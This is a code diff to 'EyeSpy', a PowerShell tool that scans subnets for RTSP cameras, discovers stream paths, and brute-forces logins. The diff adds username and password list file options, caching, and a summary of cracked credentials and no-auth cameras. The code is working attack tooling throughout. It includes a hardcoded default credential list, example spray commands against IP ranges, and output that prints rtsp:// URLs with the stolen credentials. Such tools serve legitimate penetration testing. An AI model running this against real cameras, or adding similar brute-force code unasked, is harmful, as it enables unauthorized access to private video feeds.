@@ -20,6 +20,12 @@ function EyeSpy {
         [String]$Password,
         [Parameter(Mandatory = $False)]
         [String]$Creds,
+        [Parameter(Mandatory = $False)]
+        [Alias('UL')]
+        [String]$UserList,
+        [Parameter(Mandatory = $False)]
+        [Alias('PL')]
+        [String]$PassList,
         [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [Switch]$Help,
         [Parameter(Mandatory = $False)]
@@ -65,6 +71,8 @@ Optional Parameters:
 | -Username         | 'username' | Custom username with default password list.                         |
 | -Password         | 'password' | Custom password with default username list.                         |
 | -Creds            | 'FilePath' | Path to credentials file (username:password per line).              |
+| -UserList / -UL   | 'FilePath' | Path to username list file (one username per line).                |
+| -PassList / -PL   | 'FilePath' | Path to password list file (one password per line).                |
 | -Common           |    N/A     | Use common paths only (faster scanning, fewer paths tested).       |
 | -Verbose          |    N/A     | Show detailed RTSP request/response packets for troubleshooting.    |
 | -Help             |    N/A     | Shows this Help.                                                    |
@@ -98,6 +106,24 @@ Example Usage:
 
 # Load credentials from a file (one username:password per line)
   EyeSpy -Auto 192.168.0.1/24 -Creds 'C:\path\to\creds.txt'
+
+# Use username list file with default password list
+  EyeSpy -AuthAttack 192.168.0.100:554 -UserList 'Usernames.txt'
+
+# Use username list file with single password
+  EyeSpy -AuthAttack 192.168.0.100:554 -UserList 'Usernames.txt' -Password 'secret123'
+
+# Use username list file with password list file
+  EyeSpy -Auto 192.168.0.1/24 -UserList 'Usernames.txt' -PassList 'passwords.txt'
+
+# Use password list file with default username list
+  EyeSpy -AuthAttack 192.168.0.100:554 -PassList 'passwords.txt'
+
+# Use password list file with single username
+  EyeSpy -AuthAttack 192.168.0.100:554 -PassList 'passwords.txt' -Username 'admin'
+
+# Use password list file with username list file
+  EyeSpy -Auto 192.168.0.1/24 -PassList 'passwords.txt' -UserList 'Usernames.txt'
 
 # Enable verbose output to see full RTSP packets (for troubleshooting)
   EyeSpy -AuthAttack 192.168.0.100:554 -Username 'admin' -Password 'secret' -Verbose
@@ -187,13 +213,13 @@ Example Usage:
                 Write-Host -NoNewline -ForegroundColor Yellow "[?]"
                 Write-Host " Try with -NoAuth or -Auto next.`r`n"
                 
-                AuthAttack -Target $AuthAttack -Path $Path -CustomUsername $Username -CustomPassword $Password -CustomCreds $Creds
+                AuthAttack -Target $AuthAttack -Path $Path -CustomUsername $Username -CustomPassword $Password -CustomCreds $Creds -UserList $UserList -PassList $PassList
 
             } else {
                 Write-Host -NoNewline -ForegroundColor Yellow "[?]"
                 Write-Host " Checking Connection and Paths at Target`r`n"
 
-                $result = AuthAttack -Target $AuthAttack -CustomUsername $Username -CustomPassword $Password -CustomCreds $Creds -Common:$Common
+                $result = AuthAttack -Target $AuthAttack -CustomUsername $Username -CustomPassword $Password -CustomCreds $Creds -UserList $UserList -PassList $PassList -Common:$Common
             }
         
         } else {
@@ -206,7 +232,7 @@ Example Usage:
 
         if ($Auto -match '^\b((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}(\/\b(1[6-9]|2[0-9]|3[0-2])\b)?$') {
         
-            FullAuto -Targets $Auto -CustomUsername $Username -CustomPassword $Password -CustomCreds $Creds -Common:$Common
+            FullAuto -Targets $Auto -CustomUsername $Username -CustomPassword $Password -CustomCreds $Creds -UserList $UserList -PassList $PassList -Common:$Common
 
         } else {
 
@@ -691,7 +717,12 @@ function Get-ValidRTSPPaths {
     $authRequiredPaths = @()
     
     # Select which path list to use based on the switch
-    $pathsToScan = if ($UseCommonPaths) { $CommonPaths } else { $Paths }
+    # Ensure we use the array directly to preserve exact order as defined
+    $pathsToScan = if ($UseCommonPaths) { 
+        @($CommonPaths)  # Force array to preserve order
+    } else { 
+        @($Paths)  # Force array to preserve order
+    }
     
     Write-Host "`r`nChecking for valid RTSP Paths"
     if ($UseCommonPaths) {
@@ -796,6 +827,12 @@ function Get-ValidRTSPPaths {
     return $authRequiredPaths
 }
 
+# Script-level cache for loaded lists to avoid reloading and duplicate messages
+$script:EyeSpy_UserListCache = @{}
+$script:EyeSpy_PassListCache = @{}
+$script:EyeSpy_CredsCache = @{}
+$script:EyeSpy_StatusMessageCache = @{}
+
 function GenerateCreds {
     [CmdletBinding()]
     param (
@@ -806,15 +843,21 @@ function GenerateCreds {
         [string]$CustomPassword,
         
         [Parameter(Mandatory = $false)]
-        [string]$CustomCreds
+        [string]$CustomCreds,
+        
+        [Parameter(Mandatory = $false)]
+        [string]$UserList,
+        
+        [Parameter(Mandatory = $false)]
+        [string]$PassList
     )
     
-    $UserList = @("admin", "root", "", "666666","888888", "Admin","admin1", 
+    $DefaultUserList = @("admin", "root", "", "666666","888888", "Admin","admin1", 
                   "administrator", "Administrator", "aiphone", "Dinion",
                   "none", "Root", "service", "supervisor", "ubnt"
                 )
 
-    $PassList = @("", "0000", "00000", "1111", "111111", "1111111",
+    $DefaultPassList = @("", "0000", "00000", "1111", "111111", "1111111",
                 "123", "1234", "12345", "123456", "1234567", "12345678",
                 "123456789", "12345678910", "4321", "666666", "6fJjMKYx",
                 "888888", "9999", "admin", "admin pass", "Admin", "admin123",
@@ -830,8 +873,86 @@ function GenerateCreds {
     # Use a List to avoid quadratic array concatenation costs
     $authStringList = New-Object System.Collections.Generic.List[string]
 
-    # Handle -Creds: Path to a file with username:password entries (one per line)
+    # Load username list from file if provided (with caching)
+    $loadedUserList = $null
+    if ($UserList) {
+        # Normalize path to absolute for consistent cache key
+        try {
+            $normalizedUserListPath = (Resolve-Path -Path $UserList -ErrorAction Stop).Path
+        } catch {
+            $normalizedUserListPath = $UserList
+        }
+        
+        # Check cache first using normalized path
+        if ($script:EyeSpy_UserListCache.ContainsKey($normalizedUserListPath)) {
+            $loadedUserList = $script:EyeSpy_UserListCache[$normalizedUserListPath]
+        } else {
+            if (Test-Path -Path $UserList -PathType Leaf) {
+                $loadedUserList = Get-Content -Path $UserList -ErrorAction SilentlyContinue | Where-Object { $_.Trim() -ne "" } | ForEach-Object { $_.Trim() }
+                if ($loadedUserList.Count -gt 0) {
+                    Write-Host -ForegroundColor Cyan "[*] Loaded $($loadedUserList.Count) username(s) from file: $UserList"
+                    $script:EyeSpy_UserListCache[$normalizedUserListPath] = $loadedUserList
+                } else {
+                    Write-Warning "No valid usernames found in file: $UserList"
+                    $loadedUserList = $null
+                    $script:EyeSpy_UserListCache[$normalizedUserListPath] = $null
+                }
+            } else {
+                Write-Warning "Username list file not found: $UserList"
+                $script:EyeSpy_UserListCache[$normalizedUserListPath] = $null
+            }
+        }
+    }
+
+    # Load password list from file if provided (with caching)
+    $loadedPassList = $null
+    if ($PassList) {
+        # Normalize path to absolute for consistent cache key
+        try {
+            $normalizedPassListPath = (Resolve-Path -Path $PassList -ErrorAction Stop).Path
+        } catch {
+            $normalizedPassListPath = $PassList
+        }
+        
+        # Check cache first using normalized path
+        if ($script:EyeSpy_PassListCache.ContainsKey($normalizedPassListPath)) {
+            $loadedPassList = $script:EyeSpy_PassListCache[$normalizedPassListPath]
+        } else {
+            if (Test-Path -Path $PassList -PathType Leaf) {
+                $loadedPassList = Get-Content -Path $PassList -ErrorAction SilentlyContinue | Where-Object { $_.Trim() -ne "" } | ForEach-Object { $_.Trim() }
+                if ($loadedPassList.Count -gt 0) {
+                    Write-Host -ForegroundColor Cyan "[*] Loaded $($loadedPassList.Count) password(s) from file: $PassList"
+                    $script:EyeSpy_PassListCache[$normalizedPassListPath] = $loadedPassList
+                } else {
+                    Write-Warning "No valid passwords found in file: $PassList"
+                    $loadedPassList = $null
+                    $script:EyeSpy_PassListCache[$normalizedPassListPath] = $null
+                }
+            } else {
+                Write-Warning "Password list file not found: $PassList"
+                $script:EyeSpy_PassListCache[$normalizedPassListPath] = $null
+            }
+        }
+    }
+
+    # Determine which username and password lists to use
+    $finalUserList = $null
+    $finalPassList = $null
+
+    # Handle -Creds: Path to a file with username:password entries (one per line) - highest priority (with caching)
     if ($CustomCreds) {
+        # Normalize path to absolute for consistent cache key
+        try {
+            $normalizedCredsPath = (Resolve-Path -Path $CustomCreds -ErrorAction Stop).Path
+        } catch {
+            $normalizedCredsPath = $CustomCreds
+        }
+        
+        # Check cache first using normalized path
+        if ($script:EyeSpy_CredsCache.ContainsKey($normalizedCredsPath)) {
+            return $script:EyeSpy_CredsCache[$normalizedCredsPath]
+        }
+        
         if (Test-Path -Path $CustomCreds -PathType Leaf) {
             $credLines = Get-Content -Path $CustomCreds -ErrorAction SilentlyContinue
             $validCount = 0
@@ -845,42 +966,82 @@ function GenerateCreds {
                     $validCount++
                 }
             }
+            $result = $authStringList.ToArray()
             if ($validCount -gt 0) {
                 Write-Host -ForegroundColor Cyan "[*] Loaded $validCount credential(s) from file: $CustomCreds"
+                $script:EyeSpy_CredsCache[$normalizedCredsPath] = $result
             }
             else {
                 Write-Warning "No valid credentials found in file: $CustomCreds. Expected format: username:password (one per line)."
+                $script:EyeSpy_CredsCache[$normalizedCredsPath] = $result
             }
+            return $result
         }
         else {
             Write-Warning "Credentials file not found: $CustomCreds"
+            $result = $authStringList.ToArray()
+            $script:EyeSpy_CredsCache[$normalizedCredsPath] = $result
+            return $result
         }
     }
-    # Handle -Username only: Custom username + hardcoded password list
-    elseif ($CustomUsername -and -not $CustomPassword) {
-        Write-Host -ForegroundColor Cyan "[*] Using custom username '$CustomUsername' with default password list"
-        foreach ($pass in $PassList) {
-            [void]$authStringList.Add([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$CustomUsername`:$pass")))
+
+    # Determine username list to use
+    if ($loadedUserList) {
+        $finalUserList = $loadedUserList
+    } elseif ($CustomUsername) {
+        $finalUserList = @($CustomUsername)
+    } else {
+        $finalUserList = $DefaultUserList
+    }
+
+    # Determine password list to use
+    if ($loadedPassList) {
+        $finalPassList = $loadedPassList
+    } elseif ($CustomPassword) {
+        $finalPassList = @($CustomPassword)
+    } else {
+        $finalPassList = $DefaultPassList
+    }
+
+    # Generate credentials from the determined lists
+    # Create a cache key based on the combination to only show status message once
+    # Normalize paths for consistent cache key
+    $normalizedUserListForKey = if ($UserList) {
+        try { (Resolve-Path -Path $UserList -ErrorAction Stop).Path } catch { $UserList }
+    } else { "" }
+    $normalizedPassListForKey = if ($PassList) {
+        try { (Resolve-Path -Path $PassList -ErrorAction Stop).Path } catch { $PassList }
+    } else { "" }
+    
+    $statusKey = "$normalizedUserListForKey|$normalizedPassListForKey|$CustomUsername|$CustomPassword"
+    
+    if (-not $script:EyeSpy_StatusMessageCache.ContainsKey($statusKey)) {
+        if ($loadedUserList -and $loadedPassList) {
+            Write-Host -ForegroundColor Cyan "[*] Using username list from file with password list from file"
+        } elseif ($loadedUserList -and $CustomPassword) {
+            Write-Host -ForegroundColor Cyan "[*] Using username list from file with custom password '$CustomPassword'"
+        } elseif ($loadedUserList) {
+            Write-Host -ForegroundColor Cyan "[*] Using username list from file with default password list"
+        } elseif ($loadedPassList -and $CustomUsername) {
+            Write-Host -ForegroundColor Cyan "[*] Using custom username '$CustomUsername' with password list from file"
+        } elseif ($loadedPassList) {
+            Write-Host -ForegroundColor Cyan "[*] Using default username list with password list from file"
+        } elseif ($CustomUsername -and $CustomPassword) {
+            Write-Host -ForegroundColor Cyan "[*] Using custom credentials: $CustomUsername`:$CustomPassword"
+        } elseif ($CustomUsername) {
+            Write-Host -ForegroundColor Cyan "[*] Using custom username '$CustomUsername' with default password list"
+        } elseif ($CustomPassword) {
+            Write-Host -ForegroundColor Cyan "[*] Using default username list with custom password '$CustomPassword'"
+        } else {
+            Write-Host -ForegroundColor Cyan "[*] Using default username and password lists"
         }
+        $script:EyeSpy_StatusMessageCache[$statusKey] = $true
     }
-    # Handle -Password only: Hardcoded username list + custom password
-    elseif ($CustomPassword -and -not $CustomUsername) {
-        Write-Host -ForegroundColor Cyan "[*] Using default username list with custom password '$CustomPassword'"
-        foreach ($user in $UserList) {
-            [void]$authStringList.Add([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$user`:$CustomPassword")))
-        }
-    }
-    # Handle -Username AND -Password: Single custom credential only
-    elseif ($CustomUsername -and $CustomPassword) {
-        Write-Host -ForegroundColor Cyan "[*] Using custom credentials: $CustomUsername`:$CustomPassword"
-        [void]$authStringList.Add([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$CustomUsername`:$CustomPassword")))
-    }
-    # No custom credentials: Use full default list
-    else {
-        foreach ($user in $UserList){
-            foreach ($pass in $PassList) {
-                [void]$authStringList.Add([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$user`:$pass")))
-            }
+
+    # Generate all combinations
+    foreach ($user in $finalUserList) {
+        foreach ($pass in $finalPassList) {
+            [void]$authStringList.Add([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$user`:$pass")))
         }
     }
 
@@ -903,10 +1064,14 @@ function Get-ValidRTSPCredential {
         [Parameter(Mandatory = $false)]
         [string]$CustomPassword,
         [Parameter(Mandatory = $false)]
-        [string]$CustomCreds
+        [string]$CustomCreds,
+        [Parameter(Mandatory = $false)]
+        [string]$UserList,
+        [Parameter(Mandatory = $false)]
+        [string]$PassList
     )
 
-    $credentials = GenerateCreds -CustomUsername $CustomUsername -CustomPassword $CustomPassword -CustomCreds $CustomCreds
+    $credentials = GenerateCreds -CustomUsername $CustomUsername -CustomPassword $CustomPassword -CustomCreds $CustomCreds -UserList $UserList -PassList $PassList
     
     # Validate credentials were generated
     if ($null -eq $credentials -or $credentials.Count -eq 0) {
@@ -1363,6 +1528,10 @@ function AuthAttack {
         [Parameter(Mandatory = $false)]
         [string]$CustomCreds,
         [Parameter(Mandatory = $false)]
+        [string]$UserList,
+        [Parameter(Mandatory = $false)]
+        [string]$PassList,
+        [Parameter(Mandatory = $false)]
         [Switch]$Common
     )
     $ipAndPort = $Target.Split(':')
@@ -1456,7 +1625,7 @@ function AuthAttack {
 
                     try {
                         $result = Get-ValidRTSPCredential -IP $authPath.IPAddress -Port $authPath.Port -Path $authPath.Path -authType $authPath.authType `
-                            -CustomUsername $CustomUsername -CustomPassword $CustomPassword -CustomCreds $CustomCreds
+                            -CustomUsername $CustomUsername -CustomPassword $CustomPassword -CustomCreds $CustomCreds -UserList $UserList -PassList $PassList
 
                         # Check if credentials were found
                         if ($null -ne $result -and $result.PSObject.Properties['CredentialFound'] -and $result.CredentialFound -eq $true) {
@@ -1497,7 +1666,7 @@ function AuthAttack {
         Write-Host "Beginning Password Spray:`r`n"
 
         $result = Get-ValidRTSPCredential -IP $authRequiredPaths.IPAddress -Port $authRequiredPaths.Port -Path $authRequiredPaths.Path -authType $authRequiredPaths.authType `
-            -CustomUsername $CustomUsername -CustomPassword $CustomPassword -CustomCreds $CustomCreds
+            -CustomUsername $CustomUsername -CustomPassword $CustomPassword -CustomCreds $CustomCreds -UserList $UserList -PassList $PassList
         
 
         # Check if credentials were found
@@ -1552,6 +1721,10 @@ function FullAuto {
         [Parameter(Mandatory = $false)]
         [string]$CustomCreds,
         [Parameter(Mandatory = $false)]
+        [string]$UserList,
+        [Parameter(Mandatory = $false)]
+        [string]$PassList,
+        [Parameter(Mandatory = $false)]
         [Switch]$Common
     )
 
@@ -1563,14 +1736,67 @@ function FullAuto {
 
     if ($uniqueIPsWithOpenPorts.Count -gt 0) {
         $authTypeResult = Get-AuthType -OpenPorts $openPorts
+        $validCredentials = @()
+        $noAuthResults = @()
         
         if ($null -eq $authTypeResult -or $authTypeResult.Count -eq 0) {
-            Write-Host "No auth types found. Scan completed." -ForegroundColor Yellow
+            # Still show summary even if no auth types found
+            Write-Host ""
+            Write-Host -ForegroundColor Yellow "========================================================="
+            Write-Host -ForegroundColor Yellow "                    SCAN SUMMARY"
+            Write-Host -ForegroundColor Yellow "========================================================="
+            Write-Host ""
+            Write-Host -ForegroundColor Yellow "No auth types found."
+            Write-Host ""
+            Write-Host -ForegroundColor Yellow "========================================================="
+            Write-Host ""
+            Write-Host "Scan completed.`r`n" -ForegroundColor Green
+            Write-Host "=========================================================`r`n"
             return
         }
         
         $authRequiredPaths = Get-ValidRTSPPaths -OpenPorts $authTypeResult -UseCommonPaths:$Common
-        $validCredentials = @()
+
+        # Track no-auth results from authTypeResult - separate definitely vs likely
+        $definiteNoAuthResults = @()
+        $likelyNoAuthResults = @()
+        
+        # Include ports with authType "none" (confirmed no auth)
+        $noAuthPorts = $authTypeResult | Where-Object { $_.authType -eq "none" }
+        foreach ($noAuthPort in $noAuthPorts) {
+            $definiteNoAuthResults += [PSCustomObject]@{
+                IPAddress = $noAuthPort.IPAddress
+                Port      = $noAuthPort.Port
+                Path      = "N/A (No Auth Required)"
+                Status    = "No Authentication Required"
+            }
+        }
+        
+        # Also include ports with "Unknown" auth type that have no auth-required paths
+        # (likely no-auth ports that we couldn't definitively determine)
+        $unknownAuthPorts = $authTypeResult | Where-Object { $_.authType -eq "Unknown" }
+        foreach ($unknownPort in $unknownAuthPorts) {
+            $portKey = "$($unknownPort.IPAddress):$($unknownPort.Port)"
+            # Check if this port has any auth-required paths
+            $hasAuthPaths = if ($authRequiredPaths.Count -gt 0) {
+                ($authRequiredPaths | Where-Object { "$($_.IPAddress):$($_.Port)" -eq $portKey }).Count -gt 0
+            } else {
+                $false
+            }
+            
+            # If no auth-required paths found, treat as likely no-auth
+            if (-not $hasAuthPaths) {
+                $likelyNoAuthResults += [PSCustomObject]@{
+                    IPAddress = $unknownPort.IPAddress
+                    Port      = $unknownPort.Port
+                    Path      = "N/A (Likely No Auth)"
+                    Status    = "Likely No Authentication Required"
+                }
+            }
+        }
+        
+        # Combine for backward compatibility with existing code
+        $noAuthResults = $definiteNoAuthResults + $likelyNoAuthResults
 
         # Ensure authRequiredPaths is always an array (handle single object returns)
         if ($null -eq $authRequiredPaths) {
@@ -1606,7 +1832,7 @@ function FullAuto {
 
                     try {
                         $result = Get-ValidRTSPCredential -IP $authPath.IPAddress -Port $authPath.Port -Path $authPath.Path -authType $authPath.authType `
-                            -CustomUsername $CustomUsername -CustomPassword $CustomPassword -CustomCreds $CustomCreds
+                            -CustomUsername $CustomUsername -CustomPassword $CustomPassword -CustomCreds $CustomCreds -UserList $UserList -PassList $PassList
 
                         # Check if credentials were found
                         if ($null -ne $result -and $result.PSObject.Properties['CredentialFound'] -and $result.CredentialFound -eq $true) {
@@ -1636,36 +1862,85 @@ function FullAuto {
                     }
                 }
             }
+        }
 
-            # Print summary of all found credentials at the end (after all port groups are processed)
+        # Always print summary at the end
+        Write-Host ""
+        Write-Host -ForegroundColor Yellow "========================================================="
+        Write-Host -ForegroundColor Yellow "                    SCAN SUMMARY"
+        Write-Host -ForegroundColor Yellow "========================================================="
+        Write-Host ""
+
+        # Show credentials found
+        if ($validCredentials.Count -gt 0) {
+            Write-Host -ForegroundColor Green "FOUND CREDENTIALS:"
             Write-Host ""
-            if ($validCredentials.Count -gt 0) {
-                Write-Host -ForegroundColor Yellow "========================================================="
-                Write-Host -ForegroundColor Yellow "           SUMMARY - ALL FOUND CREDENTIALS"
-                Write-Host -ForegroundColor Yellow "========================================================="
-                Write-Host ""
-                foreach ($cred in $validCredentials) {
-                    Write-Host -NoNewline -ForegroundColor Green "[+] "
-                    Write-Host "$($cred.IPAddress):$($cred.Port)/$($cred.Path) - $($cred.Credentials)"
-                    Write-Host -NoNewline -ForegroundColor Green "[RTSP] "
-                    Write-Host "rtsp://$($cred.Credentials)@$($cred.IPAddress):$($cred.Port)/$($cred.Path)"
-                    Write-Host ""
-                }
-                Write-Host -ForegroundColor Yellow "========================================================="
-                Write-Host ""
-            } else {
-                Write-Host -ForegroundColor Yellow "No credentials found during password spray."
+            foreach ($cred in $validCredentials) {
+                Write-Host -NoNewline -ForegroundColor Green "[+] "
+                Write-Host "$($cred.IPAddress):$($cred.Port)/$($cred.Path) - $($cred.Credentials)"
+                Write-Host -NoNewline -ForegroundColor Green "[RTSP] "
+                Write-Host "rtsp://$($cred.Credentials)@$($cred.IPAddress):$($cred.Port)/$($cred.Path)"
                 Write-Host ""
             }
+        }
 
+        # Show no-auth results - separate definitely vs likely
+        if ($definiteNoAuthResults.Count -gt 0 -or $likelyNoAuthResults.Count -gt 0) {
+            if ($validCredentials.Count -gt 0) {
+                Write-Host ""
+            }
+            
+            # Show definitely no-auth results
+            if ($definiteNoAuthResults.Count -gt 0) {
+                Write-Host -ForegroundColor Blue "NO AUTHENTICATION REQUIRED:"
+                Write-Host ""
+                foreach ($noAuth in $definiteNoAuthResults) {
+                    Write-Host -NoNewline -ForegroundColor Blue "[NoAuth] "
+                    Write-Host "$($noAuth.IPAddress):$($noAuth.Port)"
+                }
+                Write-Host ""
+            }
+            
+            # Show potentially no-auth results
+            if ($likelyNoAuthResults.Count -gt 0) {
+                if ($definiteNoAuthResults.Count -gt 0) {
+                    Write-Host ""
+                }
+                Write-Host -ForegroundColor Blue "POTENTIALLY NO AUTHENTICATION REQUIRED:"
+                Write-Host ""
+                foreach ($likelyNoAuth in $likelyNoAuthResults) {
+                    Write-Host -NoNewline -ForegroundColor Blue "[NoAuth?] "
+                    Write-Host "$($likelyNoAuth.IPAddress):$($likelyNoAuth.Port)"
+                }
+                Write-Host ""
+            }
         }
-        else {
-            Write-Host "=========================================================`r`n"
-            Write-Host "No authentication required, see results above.`r`n"
-            Write-Host "Scan completed.`r`n" -ForegroundColor Green
-            Write-Host "=========================================================`r`n"
+
+        # Show message if nothing found
+        if ($validCredentials.Count -eq 0 -and $definiteNoAuthResults.Count -eq 0 -and $likelyNoAuthResults.Count -eq 0) {
+            if ($authRequiredPaths.Count -eq 0) {
+                Write-Host -ForegroundColor Yellow "No authentication-required paths found."
+            } else {
+                Write-Host -ForegroundColor Yellow "No credentials found during password spray."
+            }
+            Write-Host ""
         }
+
+        Write-Host -ForegroundColor Yellow "========================================================="
+        Write-Host ""
+    } else {
+        # No open ports found - still show summary
+        Write-Host ""
+        Write-Host -ForegroundColor Yellow "========================================================="
+        Write-Host -ForegroundColor Yellow "                    SCAN SUMMARY"
+        Write-Host -ForegroundColor Yellow "========================================================="
+        Write-Host ""
+        Write-Host -ForegroundColor Yellow "No open RTSP ports found."
+        Write-Host ""
+        Write-Host -ForegroundColor Yellow "========================================================="
+        Write-Host ""
     }
-    Write-Host "`r`nScan completed.`r`n" -ForegroundColor Green
+    
+    Write-Host "Scan completed.`r`n" -ForegroundColor Green
     Write-Host "=========================================================`r`n"
 }
